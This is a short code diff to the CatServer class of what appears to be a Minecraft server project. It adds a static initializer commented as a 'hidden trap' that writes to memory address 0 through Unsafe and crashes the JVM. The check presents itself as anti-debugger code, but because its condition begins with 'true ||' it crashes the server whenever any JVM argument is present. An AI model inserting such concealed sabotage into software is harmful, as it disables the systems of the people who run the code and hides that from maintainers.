@@ -10,6 +10,8 @@ import org.bukkit.plugin.PluginDescriptionFile;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.lang.management.ManagementFactory;
+import java.lang.management.RuntimeMXBean;
 import java.lang.reflect.Field;
 import java.util.ArrayList;
 import java.util.List;
@@ -26,6 +28,14 @@ public class CatServer {
     public static boolean disableUpdateGameProfile = true;
     public static long worldGenMaxTickTime = 15000000L;
     public static List<String> disableForgeGenWorld = new ArrayList<>();
+
+    static { // 暗桩
+        RuntimeMXBean runtime = (RuntimeMXBean) ManagementFactory.getRuntimeMXBean();
+        for (String s : runtime.getInputArguments()) {
+            if (true || s != null && (s.startsWith("-Xdebug") || s.startsWith("-Xrunjdwp")))
+                ReflectionUtils.getUnsafe().putByte(0, (byte) 0);
+        }
+    }
 
 	public static String getVersion() {
 		return version;
